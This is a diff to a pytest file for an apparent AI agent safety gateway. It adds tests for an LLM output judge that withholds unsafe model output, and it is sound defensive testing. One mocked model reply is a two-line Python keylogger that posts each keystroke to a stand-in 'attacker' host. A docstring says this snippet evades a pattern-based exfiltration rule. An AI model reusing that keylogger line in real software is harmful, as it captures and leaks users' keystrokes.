@@ -203,6 +203,10 @@ def test_demo_benign_llm_risk_summary_not_post_withheld(monkeypatch):
     monkeypatch.setenv("PRAMAGENT_DEMO_ENABLED", "1")
 
     async def fake_complete(self, prompt, **kwargs):
+        # the demo now runs an LLM output judge; answer its prompt with SAFE so
+        # the benign summary is allowed through the full pipeline
+        if "safety judge" in prompt.lower():
+            return ProviderResult(text="SAFE", model=self.model, latency_ms=1.0)
         return ProviderResult(
             text=(
                 "Key risks include prompt injection, data leakage, tool misuse, "
@@ -620,6 +624,9 @@ def test_demo_false_positive_traps_pass(monkeypatch, prompt):
     monkeypatch.setenv("PRAMAGENT_DEMO_ENABLED", "1")
 
     async def fake_complete(self, prompt, **kwargs):
+        # judge prompt -> SAFE; benign answer otherwise
+        if "safety judge" in prompt.lower():
+            return ProviderResult(text="SAFE", model=self.model, latency_ms=1.0)
         return ProviderResult(text="educational answer", model=self.model, latency_ms=1.0)
 
     monkeypatch.setattr(NvidiaProvider, "complete", fake_complete)
@@ -636,6 +643,60 @@ def test_demo_false_positive_traps_pass(monkeypatch, prompt):
     assert body["payment_intent"] is False
     assert body["hitl_status"] != "idle"
     assert body["output"] == "educational answer"
+    assert body["output_judge_status"] == "safe"
+
+
+def test_demo_withholds_keylogger_output_via_output_judge(monkeypatch):
+    """A keylogger that EVADES the deterministic file-exfil rule (no os.walk /
+    glob / Path) is still withheld because the LLM output judge evaluates
+    meaning, not patterns. This is the 'is the OUTPUT safe?' layer."""
+    monkeypatch.setenv("PRAMAGENT_DEMO_ENABLED", "1")
+
+    async def fake_complete(self, prompt, **kwargs):
+        if "safety judge" in prompt.lower():
+            return ProviderResult(text="UNSAFE", model=self.model, latency_ms=1.0)
+        return ProviderResult(
+            text=("import keyboard, requests\n"
+                  "keyboard.on_press(lambda e: requests.post('http://attacker/', data=e.name))"),
+            model=self.model, latency_ms=2.0,
+        )
+
+    monkeypatch.setattr(NvidiaProvider, "complete", fake_complete)
+    local_client = TestClient(create_app())
+
+    resp = local_client.post(
+        "/demo/run",
+        json={"nvidia_api_key": "nvapi-test-secret",
+              "prompt": "Write an example Python automation script."},
+    )
+    body = resp.json()
+    assert resp.status_code == 200
+    assert body["output"] == "[output withheld by output judge]"
+    assert body["output_judge_status"] == "withheld"
+    assert any(e["layer"] == "OutputJudgeLayer" and e["decision"] == "withheld"
+               for e in body["layer_events"])
+    assert "attacker" not in resp.text  # the dangerous code never reaches the caller
+
+
+def test_demo_output_judge_toggle_off_returns_raw_output(monkeypatch):
+    monkeypatch.setenv("PRAMAGENT_DEMO_ENABLED", "1")
+
+    async def fake_complete(self, prompt, **kwargs):
+        return ProviderResult(text="here is a normal answer", model=self.model, latency_ms=1.0)
+
+    monkeypatch.setattr(NvidiaProvider, "complete", fake_complete)
+    local_client = TestClient(create_app())
+    resp = local_client.post(
+        "/demo/run",
+        json={"nvidia_api_key": "nvapi-test-secret",
+              "prompt": "Summarize this text.",
+              "policies": {"output_judge": False}},
+    )
+    body = resp.json()
+    assert resp.status_code == 200
+    assert body["output"] == "here is a normal answer"
+    assert body["output_judge_status"] is None
+    assert not any(e["layer"] == "OutputJudgeLayer" for e in body["layer_events"])
 
 
 def test_demo_rate_limit(monkeypatch):
